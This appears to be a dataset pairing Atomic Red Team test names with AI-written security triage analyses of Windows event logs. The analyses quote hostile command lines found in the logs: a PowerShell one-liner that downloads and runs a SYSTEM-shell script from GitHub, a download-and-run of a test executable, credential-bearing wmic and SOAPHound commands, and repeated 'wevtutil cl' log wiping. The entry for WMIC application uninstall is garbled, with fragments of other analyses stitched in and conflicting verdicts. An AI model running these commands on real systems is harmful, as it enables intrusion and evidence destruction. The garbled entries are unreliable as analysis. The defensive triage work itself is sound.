3. **Potential Indicator of Attack or Persistence:**
   - The frequent execution of `MicrosoftEdgeUpdate.exe` in various contexts (such as `/regserver`, `/svc`, etc.) is notable, though not inherently malicious. However, executing this process multiple times close to when logs were cleared could suggest it is being manipulated or leveraged in a manner relevant to the suspicious activities observed.

4. **Persistent Whoami and Hostname Execution:**  
   - The consistent execution of `whoami.exe` and `hostname.exe` by `admin_test` may suggest reconnaissance or validation of user privileges. While these commands are typically benign, their repeated execution within the suspicious context raises a red flag.

**Assessment of Situation:**

Based on the analysis, the activities logged are suspicious with indicators suggesting potential compromise:
- Log clearance via `wevtutil.exe` initiated by a privileged user.
- Modification of service control permissions using `cmd.exe` to execute `sc.exe`.
- Contextual execution of `MicrosoftEdgeUpdate.exe`.

**Resolution:**

The overall situation is assessed as **MALICIOUS** due to the high likelihood of system compromise attempts, including evidence of log tampering, potential privilege escalation, and suspicious command-line executions.

**Guidance on How to Proceed:**

1. **Isolate the System:** Immediately isolate the affected system (Server002) to prevent further potential damage or lateral movement across the network.
2. **User Account Review:** Review the activity of the `admin_test` account to determine if the credentials have been compromised or if the user engaged in the activities.
3. **Forensic Analysis:** Conduct a forensic investigation on `Server002` to gather additional evidence and understand the full scope of the incident.
4. **Revise Security Measures:** Consider enhancing monitoring around event log clearing activities, service control changes, and execution logs for elevated execution privileges.
5. **Incident Response Team Notification:** Alert the incident response team to review these findings and coordinate a containment and eradication strategy.

It is crucial to verify this assessment with additional context and review related system logs, processes, and network traffic to confirm the nature of this incident."
Headless Chrome code execution via VBA,"After analyzing the provided Windows event logs, several indicators suggest suspicious and potentially malicious activity. Let's break down the observations:

1. **Evidence of Log Tampering and Clearing (Log File Cleared Events):**
   - There are multiple entries in the Security and System logs indicating that the event logs on the host have been cleared (\`EventID: 1102\` in Security, \`EventID: 104\` in System). The user associated with these actions is \`SERVER002\\admin_test\`.
   - Clearing of logs is a known tactic used by attackers to cover tracks after malicious activities. This should be considered a significant red flag.

2. **Suspicious PowerShell Activity:**
   - The PowerShell logs (\`EventID: 600\`, \`EventID: 400\`) indicate the execution of a PowerShell script that downloads and runs a script from a potentially malicious URL: ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"".
   - The script being executed is related to ""Invoke-Maldoc,"" which suggests possible execution of malicious macros or payload delivery, typically associated with phishing attacks or initial stages of an attack.

3. **Sysmon Logs Indicating System Utility and PowerShell Usage:**
   - Multiple processes executed by \`SERVER002\\admin_test\` include PowerShell and \`wevtutil.exe\`, indicating attempts to manipulate event logs using command-line utilities, another tactic employed to tamper with evidence of malicious activities.
   - There are also frequent executions of \`hostname.exe\`, \`whoami.exe\`, and other system enumeration tools, which can be involved in reconnaissance activities post-compromise.

4. **EdgeUpdate Activity:**
   - While many EdgeUpdate events might be benign, frequent service starts and stops (\`EventID: 0\`) for ""edgeupdate"" occur around the same timeframe and could be used as part of legitimate software updates. However, given the surrounding context of log clearing and suspicious PowerShell usage, it should also be reviewed to ensure it isn't being leveraged for lateral movement or persistence.

**Assessment:**
- The combination of log clearing activities, suspicious PowerShell command execution downloading from an external resource, and the sequence of utility executions strongly indicates the presence of malicious behavior on this host.
- These activities correspond to typical post-exploitation tactics where attackers attempt to evade detection and maintain control over a compromised system.

**Resolution: MALICIOUS**
- The logs present substantial signs of compromise. Immediate action should be taken to isolate the affected host, conduct a thorough forensic investigation to determine the full scope of the compromise, and implement incident response procedures to mitigate the threat.
- Review and monitor related network traffic for any other systems showing similar indicators and ensure EDR and other security tools are tuned to detect such activities in the future."
Command prompt writing script to file then executes it,"### Analysis

Upon reviewing the provided Windows event logs, we observe several indicators that suggest potential malicious activity, particularly focusing on event clearing and process executions that are generally associated with attacker behavior.

#### Suspicious Activities:

1. **Log Clearance Events:**
   - **Event ID 1102 (Security log cleared):** The Security log entry indicates the action of log clearing performed by the user `admin_test` under `SERVER002` at `12:27:24`.
   - **Event ID 104 (System log cleared):** Similar actions were observed where the System and Windows PowerShell logs were cleared by `admin_test`.

   The clearing of event logs is a classic indicator of an attempt to cover tracks, commonly associated with malicious activity.

2. **Process Exploitation:**
   - **Use of `wevtutil.exe`:** Several entries in the Sysmon logs show the execution of `wevtutil.exe`, used with the ""cl"" (clear) command on various logs (Microsoft-Windows-Sysmon/Operational, Application, Security, and Windows PowerShell). 
   - These processes were executed by `admin_test` and are suspicious because `wevtutil.exe` is typically used to query or clear event logs, which aligns with an attempt to hide activities.

3. **Command Execution in Temp Directory:**
   - An instance of `cmd.exe` executing from the `Temp` directory, which in itself is not unusual. However, the command line argument to create and execute a `.vbs` script is unusual behavior for regular administrative tasks and could be indicative of script-based exploitation or automation used by an attacker.

4. **Frequent Usage of `conhost.exe`:**
   - The `conhost.exe` is observed frequently in the logs. While it is a legitimate process, it frequently accompanies suspicious command-line utility calls in this context, specifically being spawned by `wevtutil.exe` and `cmd.exe` which were executing suspicious commands.

5. **Process Execution Details:**
   - High integrity level processes running as `admin_test` further corroborate potential misuse of administrative permissions that might have been compromised.

6. **EdgeUpdate Process Details:**
   - Numerous entries relate to processes under `MicrosoftEdgeUpdate.exe`. These processes themselves appear to operate at a system integrity level, which is normal for updating mechanism but warrant further monitoring due to the timeline coinciding with the unusual log clearing.

### Threat Assessment

- **Event Log Clearing:** Indicates attempts to hide evidence of potentially malicious actions.
- **Potential Privilege Misuse:** The use of administrative privileges (`admin_test` account) for suspicious activities suggests user account compromise.
- **Script Execution and Automated Commands:** Suggest execution chains that are indicative of scripted attacks or penetration testing tools.

### Guidance

Given these elements of suspicious activity, I recommend the following actions:

1. **Account Review:** Investigate the `admin_test` account for unauthorized access, including reviewing access logs and recent changes in permissions.
2. **Endpoint Monitoring:** Review EDR logs for any other machines showing similar behaviors or related indicators of compromise.
3. **Malware Scanning and Analysis:** Conduct in-depth scans of the affected system for any malware or unauthorized scripts and analyze any recovered artifacts.
4. **Enhanced Logging and Alerts:** Increase logging and alerting around the use of tools like `wevtutil.exe`, particularly for log clearing commands.
5. **Incident Report and Response:** Given the potential impact, generate an incident report and assess if additional response measures, such as isolating the machine, are necessary.

### Resolution

**MALICIOUS** - The logs contain clear activity indicative of an attempted or ongoing compromise, including evidence of event log tampering and possibly a scripted or automated attack vector."
WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique,"Upon analysis of the provided event logs, several indicators point towards potentially malicious activity:

1. **Unusual Execution of PowerShell**: 
   - There is a PowerShell execution logged: `""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')}`. This command is indicative of a script attempting to download and execute code from the internet, which is a common tactic used by attackers to execute malicious scripts remotely.

2. **Process Chain Consistency and Log Clearing**:
   - The process logs show executions of `wevtutil.exe` used to clear event logs (evident from the cleared logs for channels such as `Sysmon`, `PowerShell`, `Security`, and `System`). Clearing logs is typically done to hide traces of unauthorized or malicious activities.

3. **High Integrity Processes**:
   - The sessions are run at a high integrity level, indicating potential privilege escalation or execution with elevated rights, which can be abused for malicious purposes.

4. **HostName and Whoami Commands**:
   - Frequent use of `whoami.exe` and `hostname.exe` shortly after suspect activities could indicate attempts to gather information about the compromised system.

5. **Logon User & Execution Context**:
   - The user executing these commands, `SERVER002\\admin_test`, and the context presented appear consistent, suggesting that if this behavior isn't tied to expected administrative tasks, it could be performed under unauthorized access to an admin account.

**Assessment**:
The presence of suspicious command-line executions, attempts to clear logs, and high-integrity level execution strongly suggest malicious activities aimed at compromising the system, escalating privileges, or maintaining persistence without detection.

**Resolution**: MALICIOUS

**Recommended Actions**:
- Isolate the affected machine to prevent further potential damage or exfiltration.
- Conduct a full investigation to determine how the access was gained (e.g., phishing, unpatched vulnerability).
- Review and potentially reset credentials for the `admin_test` user.
- Update all detection and logging capabilities to capture such behaviors in the future.
- Implement strict application whitelisting policies to prevent unauthorized PowerShell scripts from executing.
- Continuously monitor network traffic for signs of communication with known malicious domains or IPs."
Application uninstall using WMIC,"Upon analyzing the provided event logs, a few key observations can be made:

   - System Event IDs 104: Similar log clearing events are observed for the System and Windows PowerShell channels. Again, this behavior is quite suspicious, as clearing of logs can indicate an attempt to cover up actions that have taken place.

2. **Suspicious Command-Line Executions**:
   - Several instances of the `wevtutil.exe` utility being executed to clear logs for multiple channels (Sysmon, Application, Security, and PowerShell). The command lines used are consistent with those that might be employed by a malicious actor trying to hide their actions by clearing event logs.

3. **Potentially Malicious Software Uninstallation**:
   - A `cmd.exe` process executes `wmic` to uninstall software identified as ""Tightvnc"". This action could be suspicious, particularly if TightVNC is used normally within the environment, suggesting unauthorized removal.

4. **Elevation of Privileges**:
   - The use of PowerShell, `wevtutil`, and `cmd` with high integrity levels suggests operations might have been performed with elevated privileges, potentially indicating privilege escalation or exploitation.

5. **Normal Software Update Activities**:
   - The execution of Microsoft Edge updates (`MicrosoftEdge_X64_130.0.2849.46_129.0.2792.89.exe`) and corresponding logs appear to be benign, as they involve system-level processes associated with legitimate software updates.

### Conclusion:
Collectively, these logs contain indicators of suspicious or potentially malicious behavior:

- The systematic clearing of event logs (Security, System, and PowerShell) is a well-known tactic to cover tracks. This, combined with the context of unusual software uninstall commands, suggests unauthorized or malicious intent.

### Resolution:
**MALICIOUS** - The activity observed is consistent with attempts to hide unauthorized actions, suggesting evidence of compromise or unauthorized actions on the system.

1. **Frequent and Structured Use of `wevtutil.exe`:** We see recurrent execution of `wevtutil.exe` which is used to clear logs, e.g., the commands `cl Microsoft-Windows-Sysmon/Operational`, `cl System`, and `cl Security`. Such activity is often associated with attempts to cover tracks by an adversary post-exploitation.
  
2. **Log Clearing Activities:**
   - Events in the `System`, `Security`, and `Windows PowerShell` logs indicate they have been cleared by the user `admin_test`. The clearing of logs, coupled with the use of `wevtutil.exe`, suggests someone might be attempting to hide their actions from forensic examination.

3. **Execution of Potentially Malicious Scripts:**
   - The logs indicate the execution of non-standard executables from temporary directories (e.g., `namedpipes_executor.exe`, `namedpipes_server.exe`, `namedpipes_client.exe`). These files do not seem to be legitimate system files and their execution within a short time frame is suspicious, suggesting potential use in a lateral movement or data exfiltration attempt.

4. **Elevation and Privilege Usage:**
   - Privilege-escalation related events (`EventID 4672`) show `SeDebugPrivilege` and related privileges assigned to `admin_test`, indicating high privilege access which can potentially be used for malicious purposes.

5. **Suspicious Use of `cmd.exe`:**
   - The logs indicate execution in a command prompt (using `cmd.exe`) related to invoking `namedpipes_executor.exe` from a path indicative of potentially untrusted sources or temporary files (e.g., in `AppData\\Local\\Temp`). Execution from such locations can often indicate malicious intent, especially in conjunction with other activities like clearing logs or privilege assignments.

Based on these observations, the combination of extensive log clearing actions, usage of potentially malicious executables, privilege escalation, and general unauthorized system behaviors strongly indicate malicious activities.

**Resolution: MALICIOUS**

### Guidance:

- **Immediate Action Required:** Isolate the affected machine (Server002) from the network to prevent any potential further exploitation or lateral movement.

- **Detailed Forensic Examination:** Conduct a full forensic analysis of Server002 to understand the scope of the compromise, and identify data exfiltrated or altered. Review for any persistence mechanisms that may have been deployed.

   - **Microsoft Edge Updates**: Numerous logs related to Microsoft Edge updates (`MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateSetup.exe`). The events appear consistent with legitimate software update processes.

3. **Time Manipulation**:
   - Slight time differences noted in the system time adjustments (event ID `4616` from the security logs). While time changes alone are not inherently malicious, combined with log clearing, it may indicate an attempt to further obscure activity timeframes.

**Assessment:**
The activities around log clearing, coupled with the execution of possible red team tools, indicate potentially malicious or at least unauthorized activity intended to evade detection. The presence of legitimate update events suggests normal operations alongside more concerning behaviors.

**Resolution**: **SUSPICIOUS**

**Guidance**:
- Conduct further investigation to determine if the `wevtutil.exe` executions and `cmd.exe` invocation of the Atomic Red Team tool was part of any authorized penetration testing or red team exercise.
- Correlate with other security solutions (e.g., EDR alerts, antivirus logs) for broader context on `admin_test` user's activities.
- Verify with IT or security teams for any scheduled updates or tests that could explain the usage patterns.
- Check the integrity of other systems and users to ensure no further spread or impact outside this host.
- Strengthen monitoring for abnormal usage patterns and conduct threat hunting to ensure no further indicators of compromise are present."
WMI Execute Local Process,"Upon analyzing the provided Windows event logs, the following observations stand out as potential indicators of malicious activity:

1. **Event ID 1102 in Security Log:**
   - The event ID 1102 indicates that audit logs have been cleared. This is executed by the user ""admin_test"" on the computer ""Server002."" Clearing security logs can be a notable indicator of an attempt to cover tracks after a potential unauthorized or malicious action.

2. **Sysmon Logs:**
   - There are multiple instances of ""wevtutil.exe"" being executed with the `cl` (clear logs) command on different event logs, including ""Sysmon/Operational,"" ""Application,"" ""System,"" ""Security,"" and ""Windows PowerShell."" This behavior aligns with the logs being cleared as mentioned above and strongly suggests an attempt to delete traces of activity.

3. **Usage of Windows Utility Tools:**
   - We observe command executions including tools like ""wevtutil.exe,"" ""cmd.exe,"" ""HOSTNAME.EXE,"" and ""whoami.exe."" While these tools are legitimate Windows utilities, their execution sequence here raises suspicion, especially combined with the log clearance actions.

4. **Chain of Process Creation:**
   - A command (`wmic process call create notepad.exe`) was executed, followed by the creation of the ""notepad.exe"" process, originating from ""cmd.exe"" under the user ""admin_test."" The use of WMI (Windows Management Instrumentation) in such a manner could indicate scripting activity potentially launched from an external or remote scheduler.

5. **Cleared Logs:**
   - Additional logs mention the clearing of the ""System"" and ""Windows PowerShell"" channels by the same user. These events align temporally with other suspicious activities recorded in the operational events for ""admin_test.""

**Assessment & Recommendation:**
- **Resolution:** MALICIOUS
- **Threats Identified:** The activity identified includes log clearance, usage of system utilities in a potentially harmful manner, and unexpected process creation using WMI.
- **Guidance:** Immediate steps should include:
  - Isolate the affected machine (Server002) from the network to prevent further malicious activity.
  - Conduct a full forensic investigation on the affected machine to determine the origin of these commands and any additional compromise.
  - Review and tighten logging and monitoring policies to detect similar activities earlier.
  - Assess any unauthorized access to determine if sensitive information was exposed or lost.

The observed actions are consistent with steps typically taken to obscure unauthorized and potentially harmful activity within a Windows environment. These actions necessitate immediate intervention to prevent escalation or data loss."
Potentially Unwanted Applications (PUA),"Based on the provided Windows event logs, here is a detailed analysis of the events:

1. **Event Clearing Activity**:
   - The security event log (EventID 1102) and system log (EventID 104) indicate that logs were cleared by the user ""admin_test"". Log clearing is a crucial indicator of potential malicious activity because attackers often clear logs to cover their tracks after compromising a system.

2. **Use of `wevtutil`**:
   - Multiple instances of the `wevtutil.exe` utility were used to clear different event logs (Sysmon, Application, System, Security, Windows PowerShell). This tool is typically used for managing Windows event logs and its misuse suggests an attempt to delete log evidence.

3. **Suspicious PowerShell Activity**:
   - The PowerShell log shows an attempt to download and execute a file called `PotentiallyUnwanted.exe` using the `Invoke-WebRequest` cmdlet. The URL (http://amtso.eicar.org/PotentiallyUnwanted.exe) is related to security testing, but the practice of downloading and running executables in this manner can be highly suspicious if not intentional for security testing.
   - The process `powershell.exe` executed the command which leads to the creation of a potentially unwanted executable.

4. **Process Execution**:
   - The execution of potentially malicious executable (`PotentiallyUnwanted.exe`) was logged by Sysmon. This file was downloaded in the `%TEMP%` directory and then executed, which is a known pattern for malware delivery and execution.
 
5. **Timeline**:
   - The sequence of events clearly shows the use of `wevtutil` to clear logs immediately after suspicious PowerShell activity which involved downloading and executing an unverified executable. This indicates an attempt to obfuscate potentially malicious actions.

6. **Windows Defender**:
   - The logs indicate that Windows Defender was operational and there was a Security Intelligence Update (EventID 19) recorded. However, updating Defender does not counteract the potential threat if malicious activities are being obfuscated through log clearance.

**Assessment and Resolution**:

- **Assessment**: The activities observed in the logs are highly indicative of malicious behavior due to the following reasons:
  - Clearing event logs systematically, especially security and sysmon logs, is a strong intention to hide traces.
  - Executing scripts from PowerShell to fetch and run executables from the internet is suspicious if not documented as a legitimate activity.
  - The potential of malware execution, as showcased in the timeline, follows typical threat vectors of lateral movement or payload execution.

- **Recommendation**: Immediate action should be taken to isolate the affected system to prevent potential spread or data loss. Full forensic investigation should be conducted to determine the extent of the compromise and any present dangers.

- **Resolution**: **MALICIOUS** - The logs contain activity that is confirmed to be malicious and requires prompt action to mitigate potential damage."
ESXi - Install a custom VIB on an ESXi host,"Based on the provided log entries, here is a detailed analysis:

### Summary of Findings:
1. **Log Clearing Detected:**
   - Multiple event log clearances were observed in the system, PowerShell, and security logs by the user ""admin_test"". Clearing of log files, especially the Security and Sysmon logs, is generally suspicious as it could indicate an attempt to hide malicious activities.

2. **Suspicious Process Execution:**
   - The use of `wevtutil.exe` with the `cl` (Clear Logs) command is evident across the logs, clearing System, Application, Security, and Sysmon logs.
   - Powershell.exe and conhost.exe were executed by the same user ""admin_test"", linking them to potential malicious use. `wsmprovhost.exe` is the parent process, which can be manipulated using legitimate means, but frequent executions could be suspect.

3. **Remote Command Execution:**
   - There's evidence of using `cmd.exe` to execute external payloads (e.g., `pscp.exe` for SCP-like transactions) and `plink.exe` for SSH connections with potential hardcoded credentials (evident from command lines). This behavior strongly suggests the potential deployment of additional tools or lateral movement/exfiltration attempts.

4. **Benign System Processes:**
   - Several system services, such as edge updates or Windows telemetry processes, were running, which are generally benign.
   - Windows Security events 4624 (Logon) and 4672 (Special privileges assigned) can show normal system operations but given the context, such activities following log clearance raise alarms for malicious intentions.

### Assessment of Risks and Threats:
- **Log Clearance:** This is a high indicator of malicious intent, likely attempting to obfuscate other actions taken on the system.
- **Unusual Process Executions:** The use of external tools and commands in temporary directories with potential credential exposure are indicative of malicious activity.
- **Potential Data Exfiltration:** The combination of clearing logs, running processes with potential data transfer tools, suggests an attempt to exfiltrate data or prepare for further attack stages.

### Guidance for Proceeding:
- **Forensic Analysis Required:** Given the logs have been cleared and signs of exfiltration attempts or preparation, a thorough forensic investigation should be conducted on this host.
- **Isolate the Host:** Remove the host from the network to prevent further compromise or lateral movement.
- **Recover Deleted Logs:** Use forensic tools to attempt the recovery of cleared logs to garner more detailed evidence of the actions taken.
- **Review User Activity:** Check for further unauthorized access using the ""admin_test"" account and examine its actions and any linked credentials or assets.

### Resolution: MALICIOUS
The activities in the logs indicate clear indicators of malicious actions designed to compromise the integrity and confidentiality of the system. Immediate action is advised to prevent further damage or data loss."
WMI Execute Remote Process,"Based on the logs you provided, several events stand out as potentially suspicious or indicative of malicious activity. Let me break down these events and provide feedback on the observed patterns:

### Suspicious Activities and Indicators

1. **Event Log Clearing**:
   - **Security Event ID 1102** & **System Event ID 104**: Multiple entries indicate that logs were cleared by the user `admin_test`. The clearing of logs is a strong indicator of an attempt to hide malicious activities, especially when done without a known legitimate reason.

2. **Privilege Escalation and User Privileges**:
   - **Security Event ID 4672**: The user `admin_test` is found to have special privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc. While being an administrator can grant these privileges, the combination of these events and other suspicious activities might indicate misuse.
   - **Failed Login Attempts (Event ID 4625)**: Multiple failed logon attempts for the `Administrator` user by `admin_test`, using `wbem\\WMIC.exe` indicates a potential brute force attack or password spraying.

3. **Command Line and Process Execution**:
   - **Sysmon Event ID 1**: The execution of `cmd.exe` with `wmic` using explicit credentials (DOMAIN\\Administrator /password:P@ssw0rd1) to start `notepad.exe` is unusual behavior. Hardcoding passwords in command lines is not a usual practice and indicates a potentially compromised account.
   - **Reopening of components like `wevtutil.exe` service** multiple times for clearing channels like Security, System, and PowerShell logs. This matches the time of log clearance events.
 
4. **Time Manipulation**:
   - **Kernel-General Event ID 1**: The system time being manipulated (i.e., changed from a future timestamp back to an earlier one) could have been aimed at bypassing time-based security controls or logs.

5. **Cleanup Tools and Commands**:
   - The utilization of `wevtutil.exe` to clear event logs implies an attempt to erase tracks usually left by unauthorized tasks or breaches.

### Risk Assessment

The combination of event log clearing, special privileges, repeated failed access attempts, explicit credential use, and unusual command executions strongly indicates malicious intent or compromise. The objective of these actions suggests attempts to cover tracks post-execution of potentially harmful command sequences. The presence of hardcoded credentials and password usage further substantiates the suspicion of compromised user activities.

### Recommendation

**Resolution: MALICIOUS**

The patterns displayed in these logs show significant signs of malicious activity. Immediate response actions should include:

- Isolating the affected system to prevent further unauthorized access and lateral movement.
- Performing a comprehensive malware and forensic analysis to identify any other malicious activity or persistence mechanisms.
- Resetting credentials for any user accounts that might have been exposed or compromised.
- Reviewing and potentially tightening security policies related to event log auditing, user privileges, and command execution monitoring.

By addressing these fronts, you can work toward mitigating any further risk and securing your systems against future breaches."
NTFS Alternate Data Stream Access,"Upon analyzing the provided logs, the following suspicious activities and potential indicators of compromise were identified:

### Key Indicators of Suspicious Activity
1. **Clearing of Event Logs:**
   - The security and system logs show evidence of log clearing, as evidenced by Event ID 1102 in the Security log and Event IDs 104 in the System log. The user `admin_test` is shown clearing logs, which is a known tactic used by attackers to cover their tracks. The logs being cleared in quick succession and under an administrative user’s context elevate the suspicion level.
   
2. **Suspicious PowerShell Commands:**
   - The execution of PowerShell with a command line that involves the use of `Invoke-Expression` (`Invoke-Expression $streamcommand`) is concerning. The `Invoke-Expression` command is often used in malicious scripts to execute dynamically created command strings, potentially allowing the execution of hidden payloads often associated with fileless malware or scripting attacks.

3. **High Integrity Level and Privileges:**
   - The user `SERVER002\\admin_test` is operating at a high integrity level and possesses multiple critical privileges, as indicated in Event ID 4672 in the Security logs. These privileges include SeDebugPrivilege, SeSecurityPrivilege, and others that enable the user to perform sensitive actions, potentially granting administrative-level access to system resources.

4. **Unusual Process Execution:**
   - Repeated calling of `wevtutil.exe`, the Windows Eventing Command Line Utility, for the manipulation of system logs, alongside numerous `conhost.exe` executions suggests potential for abuse in carrying out command-line tasks or scripting activities in an obfuscated way.

5. **Network Connections:**
   - The logs show remote logons using NTLM (Event ID 4624 in the Security log) with IP addresses in use, without specific details of justifications for these connections, which could indicate lateral movement or a remote exploit attempt.

### Assessment and Potential Risks
- The presence of log clearing activities, along with the execution of suspicious PowerShell scripts, potentially indicates an intrusion where an attacker is attempting to establish persistence, execute payloads, and cover their tracks.
- Given the combination of high integrity level actions, PowerShell script execution, and the systematic clearing of multiple logs, this suggests attempts at conducting malicious activities under the guise of a legitimate system administrator.

### Recommended Actions
1. **Immediate Incident Response:**
   - Isolate the affected system to prevent further propagation and maintain system integrity.
   - Conduct a full forensic acquisition of the machine to preserve evidence, allowing further detailed analysis.
   
2. **Review User Access and Permissions:**
   - Investigate the user `admin_test` to verify legitimacy and ensure that their credentials are not compromised.
   - Review and potentially revoke unnecessary privileges for this user account to prevent escalation.

3. **Enhance Monitoring and Detection:**
   - Increase monitoring of PowerShell usage, specifically focusing on the use of `Invoke-Expression` and other potentially dangerous cmdlets.
   - Implement stricter logging and auditing policies to catch any attempts of log tampering swiftly.

4. **Security Awareness and Training:**
   - Educate users about the dangers of using excessive privileges and help them recognize signs of account compromise.

### Conclusion
Based on the logs and activities analyzed, the findings align with classic indicators of a compromise: log clearing, suspicious PowerShell usage, and elevated privilege misuse. Therefore, the final assessment is classified as **MALICIOUS**. Immediate actions are required to mitigate potential threats and safeguard the network infrastructure."
Suspicious Execution via Windows Command Shell,"Based on the analysis of the provided Windows event logs, we can make the following observations:

1. **Log Clearing Activity**:
   - Several instances of the `wevtutil.exe` utility being used with the `cl` command likely indicate that event log clearing activities were performed. This can be observed in the logs with commands such as `""C:\Windows\system32\wevtutil.exe"" cl Application`, `""C:\Windows\system32\wevtutil.exe"" cl System`, and `""C:\Windows\system32\wevtutil.exe"" cl Security`.
   - Clearing event logs can be a strong indicator of malicious activity, especially when performed without legitimate administrative reasons.
   - The event log entries with IDs 1102 and 104 confirm that logs were indeed cleared.

2. **Suspicious CMD Activity**:
   - Execution of a suspicious `cmd.exe` command with an unusual sequence (`""cmd.exe"" /c %%LOCALAPPDATA:~-3,1%%md /c echo Hello, from CMD! > hello.txt & type hello.txt`). This command is obfuscated and may indicate an attempt to hide the executing command's true intention. This obfuscation pattern can sometimes be used in malicious scripts to bypass basic detection mechanisms.

3. **Integrity Level**:
   - The processes run by `SERVER002\admin_test` have a high integrity level, suggesting administrative privileges are being used. Log clearing activities performed with such privileges are alarming without a legitimate reason.

4. **Microsoft Edge Update Activities**:
   - Numerous logs show activities associated with Microsoft Edge Update processes. While significant in volume, they follow expected behaviors for automatic updates, running under `NT AUTHORITY\SYSTEM`. This pattern is typical for scheduled software update tasks and does not, by itself, indicate malicious activity.

5. **Logon Session**:
   - All suspicious commands are executed under the user `SERVER002\admin_test` in the context of the same logon session (`LogonId: 0x12D4B3`).

6. **Other System Events**:
   - Time-related adjustments and regular system operations, such as updates of Microsoft Edge, appear to be benign and follow typical system behavior.

### Assessment

Given the clear evidence of log-clearing activities, use of command-line based obfuscation, and the high-integrity level under which these tasks were performed, it suggests attempts to hide potentially malicious activities.

### Resolution

- **MALICIOUS**: The presence of log-clearing activities combined with suspicious command executions strongly indicates malicious intent.

### Guidance

- **Immediate Actions**:
  - Alert the IT Security team to investigate the current status and integrity of `Server002`. Conduct a thorough forensic analysis.
  - Isolate the affected machine to prevent further potential malicious activities or lateral movement within the network.
  
- **Long-term Recommendations**:
  - Regularly review policies on log retention and access to administrative functions.
  - Enhance monitoring for process executions that clear logs or run obfuscated commands.
  - Implement stricter access controls and multi-factor authentication for accounts with administrative privileges.
  
Further investigation and appropriate containment measures should be pursued to protect the network environment and determine the full scope and intent of the activities observed."
SOAPHound - Build Cache,"The analysis of the provided Windows event logs reveals several indicators of potentially malicious activity. The following points summarize these findings:

1. **Log Clearing**: There are events indicating that the event logs for the System, Security, and Windows PowerShell channels were cleared. Specifically, Event ID 104 in the System log and Event ID 1102 in the Security log indicate that logs were cleared by the user `admin_test`. This is often a precursor to hiding actions taken by an attacker.

2. **PowerShell Execution**: The PowerShell logs show an execution of a command referencing a tool named `SOAPHound.exe`, which is located in a temporary directory associated with `AtomicRedTeam`. The command includes explicit credentials `--user $($env:USERNAME)@$($env:USERDOMAIN) --password P@ssword1`. This suggests a scripted or automated action, possibly related to a penetration testing or red-teaming tool. The use of explicit passwords in scripts is concerning and suggests improper handling of credentials.

3. **Unusual Use of `wevtutil`**: The Sysmon logs show repeated usage of `wevtutil.exe` with the ""cl"" (clear) argument on various event logs, which aligns with the log-clearing activity detected. This is a tool often abused by attackers to clear logs post-compromise.

4. **Kernel Time Changes**: There are several events associated with time changes by the `svchost.exe` process. While this can occur for legitimate reasons, it's often associated with attempts to manipulate system time to evade detection mechanisms that rely on timestamps.

5. **Unfamiliar or Non-standard Processes**: The presence of tools like `SOAPHound.exe` and actions targeting registries or cache files in a manner that mimics attack simulation frameworks adds to the suspicion of deliberate adversarial activity or cybersecurity exercises that went unreported or improperly managed.

Based on the evidence above, the logs contain several activities that raise red flags about potential malicious actions or simulation exercises. These actions require a closer examination to identify whether they relate to authorized cybersecurity testing or unauthorized access.

**Resolution**: SUSPICIOUS

**Guidance on how to proceed**:
- Validate if a legitimate red team or penetration test was authorized during the timeframe these events occurred. If yes, correlate these actions with the test’s scope and determine if any security controls were deviated.
- Conduct a full audit and review of the account `admin_test` for unusual logins, privilege escalation, or other lateral movement indicators.
- Immediately change any credentials that were exposed in the PowerShell script. Review the use of any credential storage practices.
- Carry out a broader forensic analysis on the involved host to determine other potential unauthorized actions or persistence mechanisms, and remove any malicious software or unauthorized tools like `SOAPHound.exe`.
- Implement and improve logging and alerting mechanisms to capture and respond to similar future incidents."
JScript execution to gather local computer information via wscript,"Based on the provided Windows event logs, several suspicious activities can be identified:

1. **Event Log Clearance**: The first log entry in the security log indicates event log clearance (`EventID 1102`). Logs from the Security, System, and Windows PowerShell channels were all cleared by the user `SERVER002\admin_test`, which can be a strong indication of malicious activity or an attempt to cover tracks.

2. **Privileged Logons and Privilege Escalations**: There are numerous entries related to privileged operations and logons under the `SYSTEM` user account. The logs show `EventID 4672`, indicating that accounts have been granted special privileges. Persistent and repeated logons and privilege assignments to the `SYSTEM` account are noted, which could suggest privilege escalation or malware activity that uses escalated privileges.

3. **Suspicious PowerShell Activity**: Multiple PowerShell executions are noted with commands like `Write-Host 'Final result: 1';` and more complex scripts involving system paths (`$env:WinDir`). These could either be legitimate system checks or injected scripts used by an attacker, making them worth further scrutiny.

4. **Task Host and CompatTelRunner Execution**: There are multiple instances of `taskhostw.exe` and `CompatTelRunner.exe` processes being triggered. While these processes can be legitimate, they are often associated with telemetry and task scheduling. Frequent execution could indicate misuse by malicious entities, especially when associated with automatic or uncalled-for data evaluation.

5. **Use of `wevtutil.exe`**: This utility was used to clear event logs, which is a direct action signifying an attempt to eliminate log entries that could identify malicious activities. The command used (`""C:\Windows\system32\wevtutil.exe"" cl Security`) directly indicates log clearance actions.

6. **Events and Processes Running as SYSTEM**: There is significant activity with several processes identified running as `NT AUTHORITY\SYSTEM`. While some of this activity can be expected, the frequency and variety of these SYSTEM level activities in a short period can suggest process injection or system reconnaissance by malicious actors.

**Assessment & Resolution**:
- **Threat and Risk**: The behavior observed in these logs, particularly log erasure and extensive use of PowerShell, presents a high risk of compromise. Such activities are typical of threat actors seeking to evade detection by forensics and logs.
- **Recommendation**: Immediate investigation and containment are necessary. All listed activities should be carefully reviewed, any unknown or unauthorized access should be terminated, and the system should be isolated to prevent further action by potential attackers.

The provided logs indicate **MALICIOUS** activity, based on event log clearance, possible privilege escalation, and suspicious use of PowerShell and critical system processes. Further investigation should be undertaken to understand the full scope of the compromise and remediate the issue."
Create and Execute Batch Script,"Based on the provided Windows event logs, let's analyze the activity and determine the nature of the events.

### Anomalous and Suspicious Activity

1. **Log Clearing Events**:
    - **System Log (EventID: 104)** and **Security Log (EventID: 1102)**: Both indicate that event logs have been cleared by the user `admin_test`. This is often a tactic used by malicious actors to cover their tracks after unauthorized activities. It's unusual for legitimate users to clear logs without a proper reason or documentation.

2. **PowerShell Execution**:
